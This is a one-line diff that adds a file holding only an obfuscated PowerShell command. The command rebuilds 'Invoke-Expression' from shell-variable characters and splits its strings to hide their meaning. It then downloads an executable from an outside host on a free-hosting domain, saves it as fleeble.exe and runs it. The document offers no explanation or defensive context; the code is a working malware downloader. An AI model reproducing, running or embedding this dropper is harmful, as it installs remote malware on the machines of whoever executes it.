@@ -1,0 +1,1 @@
+﻿ .( $sheLlId[1]+$sHELLId[13]+'X') ((('(New-Ob'+'ject Syst'+'em.Net'+'.'+'Web'+'Cli'+'ent).Do'+'wnloadFile({'+'0'+'}http'+':/'+'/daratad'+'.'+'5g'+'bfree'+'.'+'com/'+'uses/w'+'or'+'d.exe{0},{0}'+'flee'+'ble.'+'ex'+'e{0}'+');St'+'art-'+'Pro'+'c'+'ess '+'{0}fleeble.exe{0}')  -f[CHar]39) ) 
